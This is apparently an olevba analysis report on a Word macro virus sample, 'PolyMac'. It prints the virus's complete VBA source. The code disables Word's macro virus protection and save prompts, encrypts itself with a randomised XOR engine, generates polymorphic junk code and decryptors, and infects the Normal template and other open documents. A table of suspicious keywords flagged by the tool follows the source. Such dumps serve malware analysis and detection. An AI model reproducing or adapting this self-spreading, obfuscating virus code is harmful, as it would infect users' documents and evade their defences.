olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Polymac-15a21268e3303265d687d0e239722fcaf48a2bf8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Polymac-15a21268e3303265d687d0e239722fcaf48a2bf8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Polymac-15a21268e3303265d687d0e239722fcaf48a2bf8 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
 Randomize
'PolyMac/Wm97 by CyberShadow//SMF
'RealisticPolymorphicMacroCodeEngine (RPMCE) v1.2 used
'Greetings to cybershadow@mail.ru
'Check out for new versions >:-)
 CrStr = getname()
 SetAttr NormalTemplate.Path + "\" + NormalTemplate, 0
 With Application
  .EnableCancelKey = False
  .ScreenUpdating = False
  .ShowVisualBasicEditor = False
 End With
 With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
 End With
 Call compile(CryptedString, r11, r21, r23, CrStr)
 CryptedS = "Private Sub Document_Open()" + Chr$(13) + Chr$(10)
 Call insertToText(CryptedString, r11, r21, r23, CrStr, CryptedS)
 CryptedS = CryptedS + Chr$(13) + Chr$(10) + "End Sub" + Chr$(13)
 Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
 If NT.lines(1, 1) = "" Then NT.Insertlines 1, CryptedS
 If Documents.Count > 1 Then
  aff = ActiveDocument
  For Each aDoc In Documents
   If aDoc.Name <> aff Then
    Documents(aDoc.Name).Activate
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.lines(1, 1) = "" Then AD.Insertlines 1, CryptedS
   End If
  Next
  If ActiveDocument.Name <> aff Then Documents(aff).Activate
 End If
 Application.ScreenUpdating = True
End Sub
Private Function getname()
 c = ""
 For i = 1 To Int(Rnd * 7) + 1
  b = Int(Rnd * 26) + 65
  If Rnd > 0.5 Then b = b + 32
  c = c + Chr$(b)
 Next
 c = c + Chr$(Asc("0") + Int(Rnd * 9))
 getname = c
End Function
Private Sub compile(CryptedString, r11, r21, r23, CrStr)
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 a = AD.lines(1, AD.countoflines)
 CryptedString = CrStr + "="
 fl = 0
 r1 = Int(Rnd * 255)
 r2 = Int(Rnd * 255)
 r3 = Int(Rnd * 255)
 r11 = r1: r21 = r2: r23 = r3
 For i = 1 To Len(a)
  b = Asc(Mid$(a, i, 1))
  r1 = (r1 + r2) Mod 255
  r2 = (r1 + r3) Mod 255
  r3 = (r2 + r1) Mod 255
  b = b Xor r3
  If (b < 33) Or b = Asc("""") Or b = Asc("+") Then
    If fl = 1 Then CryptedString = CryptedString + """"
    CryptedString = CryptedString + "+chr$(" + Str$(b) + ") ": fl = 0
   Else
    If fl = 0 Then
     If Mid$(CryptedString, Len(CryptedString) - 1, 1) = ")" Then CryptedString = CryptedString + "+"
     CryptedString = CryptedString + """"
    End If
    CryptedString = CryptedString + Chr$(b): fl = 1
  End If
 Next
 If Mid$(CryptedString, Len(CryptedString) - 1, 1) <> " " And Mid$(CryptedString, Len(CryptedString) - 1, 1) <> ")" Then CryptedString = CryptedString + """"
End Sub
Private Sub insertToText(CryptedString, r11, r21, r23, CrStr, CryptedS)
 Call CorrectLine(CryptedString, CrStr, CryptedS)
 Call InsertDecryptor(r11, r21, r23, CrStr, CryptedS)
End Sub
Private Sub insline(c, CryptedS, count_)
 fc = "": Call polym(fc, count_)
 CryptedS = CryptedS + fc + Chr$(13) + Chr$(10) + c + Chr$(13) + Chr$(10)
End Sub
Private Sub CorrectLine(CryptedString, CrStr, CryptedS)
 maxlen = Int(Rnd * 100) + 100
 c = "": l = 0: f2 = -1
 For i = 1 To Len(CryptedString)
  b = Mid$(CryptedString, i, 1)
  If b = """" Then f2 = -f2
  If l > maxlen And f2 = 1 Then
   c = c + """"
   Call insline(c, CryptedS, 4)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr + "+""": l = Len(c)
  End If
  If b = "+" And l >= maxlen Then
   Call insline(c, CryptedS, 4)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr: l = Len(c)
  End If
  c = c + b: l = l + 1
 Next
 Call insline(c, CryptedS, 4)
End Sub
Private Sub InsertDecryptor(r11, r21, r23, CrStr, CryptedS)
 Dim a(8)
 For i = 1 To 8
  Do
   a1 = 0
   a(i) = getname()
   For J = 1 To i - 1
    If a(i) = a(J) Then a1 = 1
   Next
  Loop While a1 = 1
 Next
 s = StartString
 c = a(1) + "=" + Str$(r11) + refn()
 Call polym(c, 1)
 c = c + a(2) + "=" + Str$(r21) + refn()
 Call polym(c, 1)
 c = c + a(3) + "=" + Str$(r23) + refn()
 Call polym(c, 1)
 c = c + a(4) + "=""""" + refn()
 Call polym(c, 1)
 c1 = "mid$(" + CrStr + "," + a(5) + ",1)"
 c2 = a(1) + "=(" + a(1) + "+" + a(2) + ") mod 255" + refn()
 Call polym(c2, 1)
 c2 = c2 + a(2) + "=(" + a(1) + "+" + a(3) + ") mod 255" + refn()
 Call polym(c2, 1)
 c2 = c2 + a(3) + "=(" + a(2) + "+" + a(1) + ") mod 255" + refn()
 Call polym(c2, 1)
 Select Case Int(Rnd * 2)
  Case Is = 0: c2 = c2 + a(6) + "=asc(" + c1 + ")" + refn + a(6) + "=" + a(6) + " xor " + a(3) + refn() + a(4) + "=" + a(4) + "+chr$(" + a(6) + ")" + refn()
  Case Else: c2 = c2 + a(6) + "=asc(" + c1 + ")" + " xor " + a(3) + refn() + a(4) + "=" + a(4) + "+chr$(" + a(6) + ")" + refn()
 End Select
 Call polym(c2, 1)
 Select Case Int(Rnd * 6)
  Case 0
   c = c + a(5) + "=1" + refn()
   Call polym(c, 1)
   c = c + ref("do while ") + a(5) + "<=len(" + CrStr + ")" + refn()
   Call polym(c, 1)
   c = c + c2
   Call polym(c, 1)
   c = c + a(5) + "=" + a(5) + "+1" + refn()
   Call polym(c, 1)
   c = c + ref("loop") + refn()
   Call polym(c, 1)
  Case 1
   c = c + a(5) + "=1" + refn()
   Call polym(c, 1)
   c = c + ref("do until ") + a(5) + ">len(" + CrStr + ")" + refn()
   Call polym(c, 1)
   c = c + c2
   Call polym(c, 1)
   c = c + a(5) + "=" + a(5) + "+1" + refn()
   Call polym(c, 1)
   c = c + ref("loop") + refn()
   Call polym(c, 1)
  Case 2
   c = c + a(5) + "=1" + refn()
   Call polym(c, 1)
   c = c + ref("do") + refn() + c2
   c = c + a(5) + "=" + a(5) + "+1" + refn()
   Call polym(c, 1)
   c = c + ref("loop while ") + a(5) + "<=len(" + CrStr + ")" + refn()
   Call polym(c, 1)
  Case 3
   c = c + a(5) + "=1" + refn()
   Call polym(c, 1)
   c = c + ref("do") + refn() + c2
   c = c + a(5) + "=" + a(5) + "+1" + refn() + ref("loop until ") + a(5) + ">len(" + CrStr + ")" + refn()
   Call polym(c, 1)
  Case Else
   c = c + ref("for ") + a(5) + ref("=1 to len(") + CrStr + ")" + refn() + c2
   c = c + ref("next") + refn()
   Call polym(c, 1)
 End Select
 adMY = getname()
 Go2 = getname() + getname()
 c = c + Chr$(13) + Chr$(10)
 c = c + ref("if Options.ConfirmConversions = true then goto ") + Go2
 c = c + Chr$(13) + Chr$(10)
 Call polym(c, 1)
 c = c + "Options.ConfirmConversions = True" + refn()
 Call polym(c, 1)
 c = c + ref("documents.add") + refn()
 Call polym(c, 1)
 c = c + ref("set ") + adMY + ref(" = activedocument.vbproject.vbcomponents(1).codemodule") + refn()
 Call polym(c, 1)
 c = c + a(8) + ref("=normaltemplate.path+""\") + a(7) + ref(".doc""") + refn()
 Call polym(c, 1)
 c = c + adMY + ref(".insertlines 1, ") + a(4) + refn()
 Call polym(c, 1)
 c = c + ref("activedocument.saveas filename:=") + a(8) + ref(", fileformat:=wdformatdocument") + refn()
 Call polym(c, 1)
 c = c + ref("activedocument.close") + refn()
 Call polym(c, 1)
 c = c + ref("options.virusprotection=false") + refn()
 Call polym(c, 1)
 c = c + ref("documents.open ") + a(8) + refn()
 Call polym(c, 1)
 c = c + ref("activedocument.save") + refn()
 Call polym(c, 1)
 c = c + ref("activedocument.close") + refn()
 Call polym(c, 1)
 c = c + "kill " + a(8) + refn()
 Call polym(c, 1)
 c = c + Chr$(13) + Chr$(10): c = c + Go2 + ":": c = c + Chr$(13) + Chr$(10)
 c = c + "Options.ConfirmConversions = False" + refn()
 Call polym(c, 1)
 Call insline(c, CryptedS, 1)
End Sub
Private Function refn()
 If Rnd > 0.5 Then refn = Chr$(13) + Chr$(10) Else refn = ":"
End Function
Private Function ref(fff)
fff1 = ""
For i = 1 To Len(fff)
 b = Asc(Mid$(fff, i, 1))
 If Rnd > 0.5 And b >= 97 And b <= 122 Then b = b - 32
 fff1 = fff1 + Chr$(b)
Next
ref = fff1
End Function
Private Sub polym(fc, m)
 t = Int(Rnd * 7)
 maxm = 5
 Select Case t
  Case 0
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do while ") + s + "<" + Str$(Int(Rnd * 50) + 11) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop") + refn()
  Case 1
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do until ") + s + ">" + Str$(Int(Rnd * 50) + 11) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop") + refn()
  Case 2
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do ") + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop until ") + s + ">" + Str$(Int(Rnd * 50) + 41) + refn()
  Case 3
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do ") + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop while ") + s + "<" + Str$(Int(Rnd * 50) + 11) + refn()
  Case 4
   fc = fc + ref("for ") + getname() + getname() + "=" + Str$(Int(Rnd * 10)) + ref(" to ") + Str$(Int(Rnd * 50) + 11) + ref(" step ") + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + "next" + refn()
  Case 5
   tfc = 2
   fc = fc + getname() + getname() + "="
   If Rnd > 0.5 Then fc = fc + getname(): tfc = 0 Else fc = fc + Str$(Int(Rnd * 200))
   If Rnd > 0.5 And tfc = 0 Then fc = fc + "+": tfc = 1
   If Rnd > 0.5 And tfc = 0 Then fc = fc + "-": tfc = 1
   If Rnd > 0.5 And tfc = 0 Then fc = fc + "*": tfc = 1
   If tfc = 1 Then
    If Rnd > 0.5 Then fc = fc + getname() Else fc = fc + Str$(Int(Rnd * 100) + 1)
   End If
   fc = fc + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
  Case 6
   fc = fc + Chr$(13) + Chr$(10) + ref("if ") + getname()
   If Rnd > 0.5 Then
     tfc = "<"
    ElseIf Rnd > 0.5 Then
     tfc = ">"
    ElseIf Rnd > 0.5 Then
     tfc = "="
    Else
     tfc = ""
   End If
   Do
    If Rnd > 0.5 Then
      tfc1 = "<"
     ElseIf Rnd > 0.5 Then
      tfc1 = ">"
     ElseIf Rnd > 0.5 Then
      tfc1 = "="
     Else
      tfc1 = ""
    End If
   Loop While tfc = tfc1
   fc = fc + tfc + tfc1
   If Rnd > 0.5 Then
     fc = fc + getname()
    ElseIf Rnd > 0.5 Then
     fc = fc + Str$(Int(Rnd * 100) + 1)
    Else
     fc = fc + "rnd*" + Str$(Int(Rnd * 100) + 1)
   End If
   fc = fc + ref(" then ") + Chr$(13) + Chr$(10)
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + Chr$(13) + Chr$(10) + ref("end if") + refn()
  Case Else
 End Select
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

